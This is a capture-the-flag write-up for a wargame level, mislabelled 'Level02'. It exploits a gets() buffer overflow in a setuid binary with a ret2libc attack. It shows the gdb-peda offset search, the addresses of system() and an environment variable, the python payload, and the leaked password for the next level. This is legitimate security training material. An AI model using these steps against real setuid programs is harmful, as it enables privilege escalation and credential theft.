# Level02

## Setup
 * There is one file in our home, ```level04```, belonging to ```level05``` user, with suid.
 * Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

 * We run the program with gdb and we observe that:
	* `main()` is the only function of interest.
	* The program starts with a `fork()`
		* Child process will ask for a shellcode and then launch `gets()`
		* Parent process does a couple of verifications
			* `WIFEXITED()` and `WIFSIGNALED()` which does not impact us too much
			* It then checks if the child process uses `execv()` with this :
```c
ptrace_ret = ptrace(PT_READ_U, pid, 0x2c, 0x0);
if (ptrace_ret != 0xb)
	continue ;
```

## Solution
 * We will use a `buffer overflow` vulnerability on the child process
 * We will not be able to use our usual shellcode, as the parent process constantly checks for the use of `execv()`, and kills the child process if it uses it.
 * We will execute a `Ret2libc` attack with the help of `system()`, with the argument `"cd ../level05; cat .pass"`

 1. Let's get the `EIP` offset on our input. For this we can use `pattern` from gdb-peda
```gdb
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

gdb-peda$ run
[New process 1802]
Give me some shellcode, k
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

...

gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 156

```

 2. Next we will setup our argument in the environment. To make it easier we will use an empty env, and then get its address using our `env.c` in the Ressources directory.

```sh
level04@OverRide:~$ env -i COMMAND="cd ../level05; cat .pass" /var/crash/env COMMAND
COMMAND: 0xffffdfd0
```

 3. Now we want to get the address of `system()`

```gdb
 p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

 4. We can now prepare our Buffer overflow injection
 	1. [`'A' * 156`]				-> Padding to access EIP
	2. [`'\xf7\xe6\xae\xd0'[::-1]`]	-> `system()` address
	3. [`'OSEF'`]					-> Padding for using `ret` instead of `call`
	4. [`'\xff\xff\xdf\xd5'[::-1]`]	-> `COMMAND` address (we needed to add 5)

```sh
level04@OverRide:~$ python -c "print('A' * 156 +  '\xf7\xe6\xae\xd0'[::-1]) + 'OSEF' + '\xff\xff\xdf\xd5'[::-1]" > /var/crash/lvl4
```
 5. We can now execute our attack and get our flag !

```sh
level04@OverRide:~$ cat /var/crash/lvl4 | env -i COMMAND="cd ../level05; cat .pass" ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
